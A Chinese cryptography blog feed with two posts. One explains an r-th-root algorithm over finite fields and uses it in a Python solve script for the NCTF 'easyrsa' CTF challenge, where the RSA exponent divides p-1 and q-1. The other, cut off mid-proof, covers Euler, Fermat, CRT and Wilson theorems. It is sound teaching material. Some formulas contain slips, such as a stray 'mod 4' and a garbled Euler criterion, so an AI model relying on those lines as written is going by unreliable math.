c^β(c^α)^\frac{q-1-lr^s}{r^{s+1}}$</p><p>因为$c$是域$F_q$中的$r$次幂，故$ζ$拥有$r^t$阶，$(0≤t&lt;s) $（为啥这里$t$就小于$s$了，求指点~）</p><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>在域$F_q$中，我们令 $ξ $为 一个$r^2$阶本原单位根，$ξ$可以通过公式$ξ = d^\frac{q-1}{r^s}$</p><p>计算得到，其中$d$为域$F_q$中的非$r$次幂，这样的$d$可以随机选取，在域$F_q$中找到它的概率为$\frac{r-1}{r}$</p><p>由此，我们设$ξ^{r^{s-t}}$一个$r^t$阶的本原单位根，则存在一对唯一确定的$i，j$满足</p><p>$ξ^{r^{s-t}} = ζ^i, ζ = (ξ^{r^{s-t}})^j$</p><p>因为$ζ = (ξ^{r^{s-t}})^j = ζ^{ij}$, 所以我们有 $ij \equiv 1 \pmod{r^t}$</p><p>由此我们将展现一个新的定理，在合适的情况下，我们用一次指数运算可以找到$r$次剩余的一个$r$次根，</p><h4 id="定理2：定义-u-equiv-j·-r-t-−1-·r-s−t−1-equiv-−jr-s−t−1-pmod-r-s−1-那么在域-F-q-中-c-的一个-r-次根为-cbξ-u-，其中-b-在定理1中给出。"><a href="#定理2：定义-u-equiv-j·-r-t-−1-·r-s−t−1-equiv-−jr-s−t−1-pmod-r-s−1-那么在域-F-q-中-c-的一个-r-次根为-cbξ-u-，其中-b-在定理1中给出。" class="headerlink" title="定理2：定义$u \equiv  j·(r^t −1)·r^{s−t−1} \equiv −jr^{s−t−1} \pmod{ r^{s−1}}$. 那么在域$F_q$中$c$的一个$r$次根为 $cbξ^u$ ，其中$b$在定理1中给出。"></a>定理2：定义$u \equiv  j·(r^t −1)·r^{s−t−1} \equiv −jr^{s−t−1} \pmod{ r^{s−1}}$. 那么在域$F_q$中$c$的一个$r$次根为 $cbξ^u$ ，其中$b$在定理1中给出。</h4><h5 id="证明：-1"><a href="#证明：-1" class="headerlink" title="证明："></a>证明：</h5><p><img src="https://i.loli.net/2020/04/30/FqjtHNywcsbEBp3.png" alt="2"></p><p>(由于 $ξ = d^\frac{q-1}{r^s}$ ,由费马小定理，在$F_q$中 $ξ^{r^s} = 1 $易证 )</p><p>证毕。</p><p>注1： $ rβ + r −1 = lα$即 $r(β + l) + r −1 = l(α + r)$。这说明，$α \pmod{r}  ）$是确定的，$β\pmod{l}$是确定的，所以对于任意的α 满足$α^\frac{q-1}{r^s}\equiv αl \equiv -1 \pmod{r}$,都有唯一确定的β满足$rβ +r -1 = lα (i.e., β = \frac{lα+1-r}{r})$。作者在这里还加了一句，事实上，条件$rβ + r−1−lα = 0$ 可以转化为 $rβ + r−1−lα \equiv  0 \pmod{ \frac{q-1}{r} }$因为$c^\frac{q-1}{r}\equiv 1$（难道是欧拉判别定理的推广？）</p><p>注2：cb的值可以化成</p><p><img src="https://i.loli.net/2020/04/30/hMW1s87FiGQRC6g.png" alt="cb"></p><p>其中$α$是一个整数$（0&lt;α&lt;r）$，满足$1+α^\frac{q-1}{r^s}\equiv 0 \pmod{r}$所以b也可以表示为</p><p>$b = cb/c = c^\frac{l+a^\frac{q-1}{r^s}-r}{r}$</p><p>注3：对于 $ij \equiv  1 \pmod{ r^t}$ ，当$r^t$很大（$t&gt;1$ 并且在$r^t$阶循环群中的离散对数很难处理）时，其中的$i$和$j$找起来是比较困难的，所以这个方法适合在$r$和$t$都比较小的时候，也可以被视作是另一个版本的Adleman-Manders-Miller algorithm。</p><h4 id="举例与算法"><a href="#举例与算法" class="headerlink" title="举例与算法"></a>举例与算法</h4><p>终于到实例环节了~</p><h5 id="例1-q-equiv-lr-1-pmod-r-2-0-lt-l-lt-r"><a href="#例1-q-equiv-lr-1-pmod-r-2-0-lt-l-lt-r" class="headerlink" title="例1 $q \equiv  lr + 1 \pmod{ r^2} 0 &lt; l &lt; r$:"></a>例1 $q \equiv  lr + 1 \pmod{ r^2} 0 &lt; l &lt; r$:</h5><p>在这种情况下，$s=1$,所以$t=u=0$，所以$r$次根$c$可以表示为$cbξ^u = cb = c^\frac{l+a^\frac{q-1}{r^s}}{r}$</p><p>其中α需要满足$1+a^\frac{q-1}{r}\equiv 0\pmod {r}$ 当$r = 2，s=1$就意味着，$ q \equiv  3 \pmod{ 4}$ ，$α$在这里可以算出是1，带入公式，$c$的一个二次根就是众所周知的$c^\frac{p+1}{4}$，（Rabin解密~）</p><p>当$r = 3，s=1$ 就意味着 $q \equiv  4 \pmod{ 9}$ 或者 $q \equiv  7 \pmod{ 9}$，先算出$α$，然后带入公式</p><p>$c^\frac{1+2\frac{q-1}{3}}{3}= c^\frac{2q+1}{9}$，（$当 q \equiv  4 \pmod{ 9}$) 或是$c^\frac{1+1^\frac{q-3}{3}}{3} = c^\frac{q+2}{9} $（当 $q \equiv  7 \pmod{ 9}$)</p><p>这里有个表<img src="https://i.loli.net/2020/04/30/s4nvIGrOZeBEafo.png" alt="table"></p><p>最底下一样有例外，此时也就以为着$r=0，r=0.$还有啥根可开~</p><p>可见，当$s=1$时，在 $q \equiv  1 \pmod{ r}$ 并且 $q !\equiv  1 \pmod{ r^2}$ 时，即$q$的$(r-1) $种情况都可以借该公式进行一次指数运算就可开根，得到一个解。（推理过程一知半解的，但是结论用起来是真的香）</p><h5 id="例2-q-equiv-lr-2-1-pmod-r-3-0-lt-l-lt-r"><a href="#例2-q-equiv-lr-2-1-pmod-r-3-0-lt-l-lt-r" class="headerlink" title="例2 $q \equiv  lr^2 + 1 \pmod{ r^3} 0 &lt; l &lt; r$:"></a>例2 $q \equiv  lr^2 + 1 \pmod{ r^3} 0 &lt; l &lt; r$:</h5><p>当$s=2$.那么$ζ = (c^α)^\frac{q-1}{r^2}=1$)或者 是一个$r$阶本原单位根 （$ζ$是$r^t$阶，$t$=0 or 1），同时$ξ$也是一个$r^2$阶的本原单位根（原根）满足：$ξ^{r^2-t} = ζ^i 即 (ξ^{r^2-t})^j =ζ $   with $ij\equiv 1 \pmod{r^t}$</p><p>因此，$r$次根可以表示为 $cbξ^u$ ，具体的值上文已给，当$t=0，u=0，x=cb$是一个$r$次根，当$t=1,u \equiv −j \pmod{ r}$ ，$x= cbξ^{−j}$是一个$r$次根。（所以我们还是希望$t=0$，这样计算就会极其方便~）</p><h6 id="Algorithm-3-Our-cube-root-algorithm-when-q-equiv-1-pmod-9-and-q-̸-equiv-1-pmod-27"><a href="#Algorithm-3-Our-cube-root-algorithm-when-q-equiv-1-pmod-9-and-q-̸-equiv-1-pmod-27" class="headerlink" title="Algorithm 3 Our cube root algorithm when $q \equiv  1 \pmod{ 9}$ and $q ̸\equiv  1 \pmod{ 27}$"></a>Algorithm 3 Our cube root algorithm when $q \equiv  1 \pmod{ 9}$ and $q ̸\equiv  1 \pmod{ 27}$</h6><p>$x^3\equiv c \pmod{ q}$ $ (q = 9l + 1 \pmod{ 27}$ with  $ l = 1,2, i.e.$, $q \equiv  10,19 \pmod{ 27}$</p><p><img src="https://i.loli.net/2020/04/30/QYibS8IanCMRBjP.png" alt="Our cube root algorithm"></p><p>解读一下：$ξ = d^\frac{q-1}{r^s}$，其中$d$在域$F_q$种不是一个$r$次幂（遍历一下，随便取一个就好）。</p><p>$ζ=c^{r−1·b}r = c^{2·b}3=X^{2b}$</p><p>如果，$ζ=1$，则说明$t=0$，那么$x=cb=X$</p><p>如果，$ζ=B=ξ^r$，那么$t=j=1$,$x=cbξ^{-j}=cbξ^2=XA^2$</p><p>否则，$j=2,x=cbξ^{-j}=cbξ^{-2}=XA$</p><p>验证：</p><p><img src="https://i.loli.net/2020/04/30/DJIlwucFAOGNSCP.png" alt="check"></p><p>成功~</p><p>以下同</p><h6 id="Algorithm-4-Our-5-th-root-algorithm-when-q-equiv-1-pmod-25-and-q-equiv-1-pmod-125"><a href="#Algorithm-4-Our-5-th-root-algorithm-when-q-equiv-1-pmod-25-and-q-equiv-1-pmod-125" class="headerlink" title="Algorithm 4 Our 5-th root algorithm when $q \equiv  1 \pmod{ 25}$and$ q \equiv  1 \pmod{ 125}$"></a>Algorithm 4 Our 5-th root algorithm when $q \equiv  1 \pmod{ 25}$and$ q \equiv  1 \pmod{ 125}$</h6><p>$x^5=c \pmod{ q}$($q \equiv  25l + 1 \pmod{ 125}$with$ l = 1,2,3,4, $i.e., $q \equiv  26,51,76,101 \pmod{ 125}$)</p><p><img src="https://i.loli.net/2020/04/30/GpdjI3LEmOABuwb.png" alt="Algorithm 4 Our 5-th root algorithm"></p><h5 id="例3-q-equiv-lr-3-1-pmod-r-4-0-lt-l-lt-r"><a href="#例3-q-equiv-lr-3-1-pmod-r-4-0-lt-l-lt-r" class="headerlink" title="例3 $q \equiv  lr^3 + 1 \pmod{ r^4} 0 &lt; l &lt; r:$"></a>例3 $q \equiv  lr^3 + 1 \pmod{ r^4} 0 &lt; l &lt; r:$</h5><p>当$s=3$，$ζ = (c^α)^\frac{q-1}{r^3} = 1$ 有$r^t$阶$（t=0,1,2）$，同时 $ξ $是一个$r^3 $阶的原根 ，满足：</p><p>$ξ^{r^3-t} = ζ^i $ and $(ξ^{r^3-t})^j = ζ$ with $ij \equiv 1 \pmod {r^t}$</p><p>所以，$c$的$r$次根可以表示为$cbξ^u$，当$t=0，u=0,x=cb$即是$c$的一个$r$次根，当$t=1$，</p><p>$u \equiv  −jr \pmod{ r^2}$, 当$t=2$， $u \equiv  −j \pmod{ r^2}$,</p><p>计算过程类比上文，只是要考虑的（$u$）的情况增加到了r^2种。</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>回到开头说的NCTF crypto全场两解（大佬都去隔壁打D3了~）的压轴——easyrsa</p><p>题目：（数字太大，就省去了）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from rsav import * </span><br><span class="line"> </span><br><span class="line">e = 0x1337 </span><br><span class="line">p =  </span><br><span class="line">q =  </span><br><span class="line">n = p * q </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">''' </span><br><span class="line">assert(flag.startswith('NCTF')) </span><br><span class="line">m = int.from_bytes(flag.encode(), 'big') </span><br><span class="line">assert(m.bit_length() &gt; 1337) </span><br><span class="line"> </span><br><span class="line">c = pow(m, e, n) </span><br><span class="line">print(c)''' </span><br><span class="line">c=</span><br></pre></td></tr></table></figure><p>解题思路：</p><p>很普通的加密手段，然后$p,q$都给了，其中，$e|q-1；e|p-1$</p><p>唯一难点就在$e$是$φ(n)$的一个因子所以根本无法求出私钥$d$</p><p>第一步是类似rabin，先将$m^e \equiv  c \pmod{ n}$分解成同余式组</p><p>$m^e \equiv  c \pmod{ p}$</p><p>$m^e \equiv  c \pmod{ q}$</p><p>求出$m_1$和$m_2$，再用CRT就好了</p><p>至于m的求解，本题的条件正好符合上文的例1，</p><p><img src="https://i.loli.net/2020/04/30/SLkGiW31DNThBdl.png" alt="context"></p><p>于是我们先遍历出$α$，然后就可以求得$m_1$了，</p><p>再算出另一个$α$，得到$m_2$，然后CRT走一波，就可以出明文的一种情况了，</p><p>然而一共有$e^2$种情况</p><p>当$e=2$，rabin解密，有$e^2$种情况，因为同余方程组里的每一个方程都有两种情况。</p><p>当$e=3$，每个就有三种，CRT后一共就有$3^2$种</p><p>根据<a href="https://crypto.stackexchange.com/questions/63614/finding-the-n-th-root-of-unity-in-a-finite-field" target="_blank" rel="noopener">hint2</a>，里面有提供当找到一种解后找到其余解的算法</p><p><img src="https://i.loli.net/2020/04/30/VQF7UhL3DBORW4I.png" alt="sol"></p><p>在有限域$F_q$中，乘法子群的阶为$q-1$，如果$n$不满足$n|q-1$，那么$n$次单位根只有1本身，如果$n$满足$n|q-1$，那么就有$n$个单位根。</p><p>由费马小定理$(x^\frac{q-1}{n})^n = x^{q-1} = 1$        所以我们有n次单位根$x^\frac{q-1}{n}$</p><p>当我们这个n次单位根不等于1时，我们就可以利用它和我们找到的一个根来生成一个阶为$n$的循环群，这个群里所有的元素即为我们想要的所有的根。</p><p>这样我们构造exp，遍历这0x1337*0x1337=24196561种可能，就能解出真正的密文了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(x)</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            flag = hex(x)[<span class="number">2</span>:].decode(<span class="string">"hex"</span>) </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            flag = hex(x)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>) </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        flag=<span class="string">''</span> </span><br><span class="line">    <span class="keyword">return</span> flag </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">onemod</span><span class="params">(p,r)</span>:</span> </span><br><span class="line">    t=p<span class="number">-2</span> </span><br><span class="line">    <span class="keyword">while</span> pow(t,(p<span class="number">-1</span>)/r,p)==<span class="number">1</span>: t-=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> pow(t,(p<span class="number">-1</span>)/r,p) </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span><span class="params">(p,root)</span>:</span>  </span><br><span class="line">    g=onemod(p,<span class="number">0x1337</span>) </span><br><span class="line">    may=[] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1337</span>): </span><br><span class="line">        may.append(root*pow(g,i,p)%p) </span><br><span class="line">    <span class="keyword">return</span> may </span><br><span class="line"> </span><br><span class="line">c =  </span><br><span class="line"> </span><br><span class="line">p =  </span><br><span class="line"> </span><br><span class="line">q =  </span><br><span class="line">e = <span class="number">0x1337</span> </span><br><span class="line">n = p*q </span><br><span class="line"> </span><br><span class="line">c_p = pow(c,(<span class="number">1</span>+<span class="number">3307</span>*(p<span class="number">-1</span>)/e)/e,p)  <span class="comment">#p对应的α=3307 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find one"</span> </span><br><span class="line">C1=solution(p,c_p)[::<span class="number">-1</span>]   <span class="comment">#逆序，问题不大，只是跑过一次，发现答案在两千多万次后 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find all"</span> </span><br><span class="line">c_q = pow(c,(<span class="number">1</span>+(<span class="number">2649</span>*(q<span class="number">-1</span>)/e))/e,q) <span class="comment">#q对应的α=2649 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find another"</span> </span><br><span class="line">C2=solution(q,c_q)[::<span class="number">-1</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"find all"</span> </span><br><span class="line">a= gmpy2.invert(p,q) </span><br><span class="line">b = gmpy2.invert(q,p) </span><br><span class="line"><span class="comment">#x = (b*q*c_p+a*p*c_q)%n </span></span><br><span class="line">flag=<span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C1: </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> C2: </span><br><span class="line">        flag+=<span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> flag%<span class="number">1000000</span> == <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">print</span> flag </span><br><span class="line">        x = (b*q*i+a*p*j)%n </span><br><span class="line">        <span class="keyword">if</span> <span class="string">"NCTF"</span> <span class="keyword">in</span> n2s(x): </span><br><span class="line">            <span class="keyword">print</span> n2s(x) </span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/LjK7yHEBhNqga9O.png" alt="flag"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一次借NCTF了解了在域中开根的一种高效方法，</p><p>并且有幸拿到了一个一血，不得不说，这公式，真香~</p><p>另外感谢这次NCTF，在这次密码学的赛题中学到了很多，另外一道childrsa也很有意思（有意思在我意外的发现了其中一个神奇规律23333）</p><p>最后再次感谢soreatu师傅制作的优质赛题以及赛后详细的wp与指点~</p><p><del>但是这个方法的限制有点多，soreatu师傅给出的方法应该比较具有普适性，膜</del></p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 数论四大定理及应用</title>
      <link href="/2019/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2019/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/194137" target="_blank" rel="noopener">安全客</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>可以发现RSA中的很多攻击方法都是从数论四大定理推导出的，所以找时间好好学习了一下数论四大定理的证明及其应用场景——Rabin算法。</p><h2 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h2><p>若$n,a$为正整数，且$n,a$互素，即$gcd(a,n) = 1$，则</p><p>$a^{φ(n)}\equiv1\pmod{n}$</p><h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><p>首先，我们需要知道欧拉定理是什么：</p><p> 数论上的欧拉定理，指的是</p><p>$a^{φ(n)}\equiv1\pmod{n}$</p><p>这个式子实在$a$和$n$互质的前提下成立的。</p><p>证明</p><p>首先，我们知道在1到$n$的数中，与n互质的一共有$φ(n$)个，所以我们把这$φ(n)$个数拿出来，放到设出的集合X中，即为$x_1,x_2……x_{φ(n)}$</p><p>那么接下来，我们可以再设出一个集合为M，设M中的数为：</p><p>$m_1=a∗x_1,m_2=a∗x_2……m_φ(n)=a∗x_{φ(n)}$</p><p>下面我们证明两个推理：</p><h4 id="一、M中任意两个数都不模n同余。"><a href="#一、M中任意两个数都不模n同余。" class="headerlink" title="一、M中任意两个数都不模n同余。"></a>一、M中任意两个数都不模n同余。</h4><p>反证法。</p><p>证明：假设M中存在两个数设为$m_a,m_b$模$n$同余。</p><p> 即$m_a\equiv m_b$</p><p> 移项得到：$m_a−m_b=n∗k$</p><p> 再将m用x来表示得到：$a∗x_a−a∗x_b=n∗k$</p><p> 提取公因式得到：$a∗(x_a−x_b)=n∗k$</p><p> 我们现在已知$a$与$n$互质，那么式子就可以转化为：</p><p>$x_a−x_b\equiv 0 \pmod{n}$</p><p>因为$a$中没有与$n$的公因子（1除外）所以$a !\equiv  0 \pmod{n}$ 所有只能是$ x_a−x_b\equiv 0\pmod{n}$。</p><p> 又因为$x_a,x_b$都是小于$n$的并且不会相同，那么上述的式子自然全都不成立。</p><p> 假设不成立。</p><p>证得：$M$中任意两个数都不模$4$同余。</p><h4 id="二、M中的数除以n的余数全部与n互质。"><a href="#二、M中的数除以n的余数全部与n互质。" class="headerlink" title="二、M中的数除以n的余数全部与n互质。"></a>二、M中的数除以n的余数全部与n互质。</h4><p>证明：我们已知$m_i=a∗x_i$</p><p> 又因为$a$与$n$互质，$x_i$与$n$互质，所以可得$m_i$与$n$互质。</p><p> 带入到欧几里得算法中推一步就好了。</p><p> 即：</p><p>$gcd(a∗xi,n)=gcd(mi,n)=gcd(n,mi mod n)=1$</p><p>证毕。</p><h4 id="三、根据我们证得的两个性质，就可以开始推式子了。"><a href="#三、根据我们证得的两个性质，就可以开始推式子了。" class="headerlink" title="三、根据我们证得的两个性质，就可以开始推式子了。"></a>三、根据我们证得的两个性质，就可以开始推式子了。</h4><p>首先，根据前两个推论可以知道，$M$中的数分别对应$X$中的每个数模$n$同余。</p><p>（即是双射关系：首先M中的数在模n下不同余，即不相同，然后有$φ(n)$个$m$；其次有$φ(n)$个不相同的$x$与$n$互质，所以$m$与$x$是双射关系）</p><p>所以可以得到：</p><p>$m_1∗m_2∗……∗m_{φ(n)}\equiv x_1∗x_2∗……∗x_{φ(n)}\pmod{n}$</p><p>现在我们把替换成x的形式，就可以得到：</p><p>$a∗x_1∗a∗x_2∗……∗a∗x_{φ(n)}\equiv x_1∗x_2∗……∗x_{φ(n)}\pmod{n}$</p><p>$a^{φ(n)}∗(x_1∗x_2……∗x_{φ(n)})\equiv x_1∗x_2……∗x_{φ(n)}\pmod{n}$</p><p>$(a^φ(n)−1)∗(x_1∗x_2……∗x_{φ(n)})\equiv 0\pmod{n}$</p><p>然后，由于$(x_1∗x_2……∗x_{φ(n)}) !\equiv 0\pmod{n}$</p><p>所以    $(a^{φ(n)}−1)\equiv 0\pmod{n}$</p><p>所以    $a^{φ(n)}\equiv 1\pmod{n}$</p><h3 id="应用：RSA的解密"><a href="#应用：RSA的解密" class="headerlink" title="应用：RSA的解密"></a>应用：RSA的解密</h3><p>欧拉定理在RSA中可用于证明 $M\equiv C^d \pmod{N}$ ：</p><p><img src="https://i.loli.net/2020/04/30/zmodaOUq2NSv6IP.png" alt="RSA解密验证"> </p><h2 id="费马小定理（欧拉定理特殊型情况）"><a href="#费马小定理（欧拉定理特殊型情况）" class="headerlink" title="费马小定理（欧拉定理特殊型情况）"></a>费马小定理（欧拉定理特殊型情况）</h2><p> 对于质数p，任意整数a，均满足：$a^{p-1}\equiv 1 \pmod{p}$</p><p>那么，$a^{p-2}$就是a在模p下的逆元了</p><h2 id="孙子定理（中国剩余定理-CRT）"><a href="#孙子定理（中国剩余定理-CRT）" class="headerlink" title="孙子定理（中国剩余定理 CRT）"></a>孙子定理（中国剩余定理 CRT）</h2><p>设正整数$m_1,m_2…m_k$两两互素，则同余方程组<br>$x \equiv a_1 \pmod{m_1}$<br>$x \equiv a_2 \pmod{m_2}$<br>$x \equiv a_3 \pmod{m_3}$<br>…<br>$x \equiv a_k \pmod{m_k}$</p><p>有整数解。并且在模$M = m_1 \cdot m_2 \cdot … \cdot m_k$下的解是唯一的，解为<br>$x \equiv (a_1M_1M_1^{-1} + a_2M_2M_2^{-1} + … + a_kM_kM_k^{-1}) \mod M$</p><p>其中$M_i = M / m_i$，而$M_i^{-1}$为$M_i$模$m_i$的逆元。</p><h3 id="证明-1"><a href="#证明-1" class="headerlink" title="证明"></a>证明</h3><p>具体证明如下：</p><p>例：找出所有整数x,使其被3，5和7除时，余数分别为2，3和2</p><p>$x\equiv 2 \pmod{3}$</p><p>$x\equiv 3 \pmod{5}$</p><p>$x\equiv 2 \pmod{7}$</p><p>=&gt;      $x = △ + 3<em>5</em>7*t$  (△为期中的一个解，t为整数）</p><p>在同余中最重要的观念就是求出第一个解，那么$x = △ + 3<em>5</em>7*t$就是通解。那怎么求一个解呢？</p><p>利用同余的加性：</p><p>把$x$拆成$a+b+c$,即$x = a + b + c            $</p><p>令</p><p>$a\equiv 2 \pmod{3}$</p><p>$a\equiv 0 \pmod{5}$</p><p>$a\equiv 0 \pmod{7}$</p><p>=&gt; $a=35p$ ( 可以看到p取1的时候满足$a\equiv 2\pmod{3}$,即$a=35 $)</p><p><strong>为何这样取？从接下来的取法可知：b 和 c 都会取 3 的倍数，这样子就能保证，x  mod 3 = 2，我们标记这样的取法为FLAG</strong> </p><p>接下来要求b：</p><p>$b\equiv 0\pmod{3}$</p><p>$b\equiv 3\pmod{5}$</p><p>$b\equiv 0\pmod{7}$</p><p>=&gt;$b=21q$ (可以看到q取3的时候满足$b\equiv 3\pmod{5}$,即$b=63$)</p><p>求c</p><p>$c\equiv 0\pmod{3}$</p><p>$c\equiv 0\pmod{5}$</p><p>$c\equiv 2\pmod{7}$</p><p>$=&gt;$$c=15m$(可以看到m取2的时候满足$c\equiv 2\pmod{7}$,即$c=30$)</p><p>得</p><p>$x\equiv 2\pmod{3}  \equiv  a + b + c$</p><p>$x\equiv 3\pmod{5}  \equiv  a + b + c$</p><p>$x\equiv 2\pmod{7}  \equiv  a + b + c$</p><p>a  b  c 都求出来之后，可以利用同余的加性 </p><p>$x = a + b + c = 128$是一个解，  $x = 128 + 105t $在适当调整$t$之后就可以求出$x$在任何范围内的解，比如说求最小正整数解，这时候$t$取$-1$，得$x=23$</p><p>利用同余的乘性：</p><p>之前令$x = a + b + c$,用同余的乘性之后$x = 2a’ + 3b’ + 2c’$    (此时令$a’=b’=c’=1$，就相当于同余的加性了)</p><p>$a’\equiv 1\pmod{3} $</p><p>$a’\equiv 0\pmod{5}$</p><p>$a’\equiv 0\pmod{7}$</p><p>$ =&gt;a’=35p$(可以看到p取2的时候满足$a’\equiv 1\pmod{3}$,即$a’=70$)</p><p>接下来要求b’：</p><p>$b’\equiv 0\pmod{3}$</p><p>$b’\equiv 1\pmod{5}$</p><p>$b’\equiv 0\pmod{7}$</p><p>$=&gt;b’=21q$(可以看到$q$取1的时候满足$b’\equiv 1\pmod{5}$,即$b’=21$)</p><p>现在来看c’</p><p>$c’\equiv 0\pmod{3}$</p><p>$c’\equiv 0\pmod{5} $</p><p>$c’\equiv 1\pmod{7}$</p><p>$=&gt;c’=15m$(可以看到m取1的时候满足$c’\equiv 1\pmod{7}$,即$c’=15$)</p><p>有了$a’ b’ c’$之后就可以得到 $x = 2a’ + 3b’ + 2*c’ $<br>代入$a’ b’ c’$之后就可以得到$x$的一个解及其通解</p><p>$x = 2<em>70 + 3</em>21 +2*15 $</p><p>$x = 233 + 105t$</p><p>在知道同余的加性和乘性之后再看下面这个公式就没有什么问题了</p><p>$x \equiv (a_1M_1M_1^{-1} + a_2M_2M_2^{-1} + … + a_kM_kM_k^{-1}) \mod M$</p><p>其中，$a_i$就是题目所要求的剩余，$M_1$就是前文提到的标记取法<strong>FLAG</strong>，而$M_1^{-1}$就是在同余的乘法性中为了满足$a_1’\equiv 1 \pmod{m_i}$</p><h2 id="威尔逊定理"><a href="#威尔逊定理" class="headerlink" title="威尔逊定理"></a>威尔逊定理</h2><p>当且仅当p为素数时有，</p><p> <strong>$(p−1) ! \equiv  −1\pmod{p}$</strong></p><h3 id="证明："><a href="#证明：" class="headerlink" title="证明："></a>证明：</h3><p>首先：</p><p>$p−1 \equiv  −1\pmod{p}$</p><p>那么我们只需要证明 $(p−2)!\equiv 1\pmod{p} $</p><p>也就是说，除去 $1$ 后，如果 $2,3,…,p−2$ 能够两两配对，且每对数乘积模 $p$ 后为 $1$ 的话，威尔逊定理就成立了，然后我们考虑这其实就是对于$ 2,3,…,p−2$去找 模 $p$ 意义下的逆元。</p><p>然后考虑一下二次剩余里面的衍生知识，我们可以知道对于 $x^2\equiv 1\pmod{p}$只有两个解$（1，p-1）$，而这两个数已经被我们安排掉了，也就是说 $2,3,…,p−2$中不存在某个数的逆元是自己本身。</p><p>然后 集合$ A={1,2,3,…p -1}$;  构成模p乘法的缩系，即任意$i∈A$ ,存在$j∈A$,使得:     $( i，j ) \equiv  1\pmod{p}$</p><p>也就是说，除去$1$和$p-1$外，其余的两两配对互为逆元</p><p>证毕</p><h2 id="应用：Rabin算法"><a href="#应用：Rabin算法" class="headerlink" title="应用：Rabin算法"></a>应用：Rabin算法</h2><p>在解Rabin算法前，我们需要一些定理、推论</p><h3 id="定理1"><a href="#定理1" class="headerlink" title="定理1"></a>定理1</h3><p>欧拉判别定理， c是模p的平方剩余的充要条件是 ，$(c^\frac{1}{2})^{φ(n)}  \equiv  1\pmod{p}$</p><h4 id="证明：-1"><a href="#证明：-1" class="headerlink" title="证明："></a>证明：</h4><p>首先，由于$p$是一个奇素数，由费马小定理，$d^{p-1} \equiv 1 \pmod{p}$。但是$P-1$是一个偶数，所以有</p><p>$(d^{ \frac{p-1}{2} } -1) \cdot (d^{ \frac{p-1}{2} }+1) \equiv 0 \pmod{p}$</p><p>$p$ 是一个素数，所以$d^{ \frac{p-1}{2} } -1$ 和 $d^{ 